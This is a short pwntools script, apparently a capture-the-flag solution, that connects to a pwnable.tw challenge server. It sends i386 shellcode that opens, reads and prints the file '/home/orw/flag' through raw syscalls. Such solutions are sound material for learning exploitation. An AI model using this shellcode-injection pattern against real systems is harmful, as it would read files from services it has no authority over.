from pwn import *
io= remote('chall.pwnable.tw',10001)
context.arch="i386"
context.bits="32"

io.recvuntil("code:")
code=asm("""
         jmp shell

shellcode:
xor eax,eax
mov al,0x5
pop ebx
xor ecx,ecx
int 0x80

mov ebx,eax
mov dl,100
mov al,0x3
mov ecx,0x804a000
int 0x80

xor eax,eax
mov al,0x4
xor ebx,ebx
mov bl,0x1
xor edx,edx
mov dl,100
int 0x80
leave
ret

shell:
call shellcode
""")

code=code+"/home/orw/flag"

io.sendline(code)
print(io.recv())
